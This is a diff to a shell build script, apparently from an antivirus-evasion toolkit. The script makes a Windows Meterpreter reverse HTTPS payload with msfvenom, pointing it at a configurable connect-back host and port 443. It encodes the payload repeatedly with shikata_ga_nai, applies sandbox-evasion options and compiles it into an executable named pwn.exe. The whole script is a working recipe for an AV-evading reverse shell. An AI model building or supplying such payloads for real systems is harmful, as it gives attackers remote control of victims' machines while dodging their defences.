@@ -4,14 +4,23 @@
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
+
+# configure your connect-back settings here
+LHOST=192.168.2.103
+LPORT=443
+
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+
 # format the shellcode for make_avet
 ./format.sh sc.txt > scclean.txt && rm sc.txt
+
 # call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion 
 ./make_avet -f scclean.txt -F -E
+
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe avet.c
+
 # cleanup
 rm scclean.txt && echo "" > defs.h
